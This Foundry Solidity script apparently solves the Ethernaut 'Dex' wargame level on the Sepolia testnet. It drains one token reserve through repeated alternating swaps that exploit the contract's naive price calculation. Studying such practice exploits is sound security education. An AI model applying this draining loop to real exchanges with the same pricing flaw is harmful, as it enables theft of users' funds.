// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function addLiquidity(address token_address, uint256 amount) external;

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account) external view returns (uint256);
}

//forge script  --rpc-url sepolia --account metamask  Cracked22_DexScript --broadcast
contract Cracked22_DexScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Dex_address"));
    }

    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));
        IDex dex = IDex(ethernaut_contracts);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(ethernaut_contracts, type(uint256).max);
        while (dex.balanceOf(token1, ethernaut_contracts) > 0 && dex.balanceOf(token2, ethernaut_contracts) > 0) {
            uint256 token1ForPlayer = dex.balanceOf(token1, player);
            uint256 token2ForPlayer = dex.balanceOf(token2, player);
            uint256 token1ForEthernaut = dex.balanceOf(token1, ethernaut_contracts);
            uint256 token2ForEthernaut = dex.balanceOf(token2, ethernaut_contracts);

            if (token1ForPlayer > 0) {
                dex.swap(token1, token2, token1ForEthernaut > token1ForPlayer ? token1ForPlayer : token1ForEthernaut);
            } else if (token2ForPlayer > 0) {
                dex.swap(token2, token1, token2ForEthernaut > token2ForPlayer ? token2ForPlayer : token2ForEthernaut);
            }
        }
        console.log("ethernaut_contracts token1 is", dex.balanceOf(token1, ethernaut_contracts));
        console.log("ethernaut_contracts token2 is", dex.balanceOf(token2, ethernaut_contracts));
        console.log("player token1 is", dex.balanceOf(token1, player));
        console.log("player token2 is", dex.balanceOf(token2, player));

        require(dex.balanceOf(token1, ethernaut_contracts) == 0 || dex.balanceOf(token2, ethernaut_contracts) == 0, "fail");
        vm.stopBroadcast();
    }
}
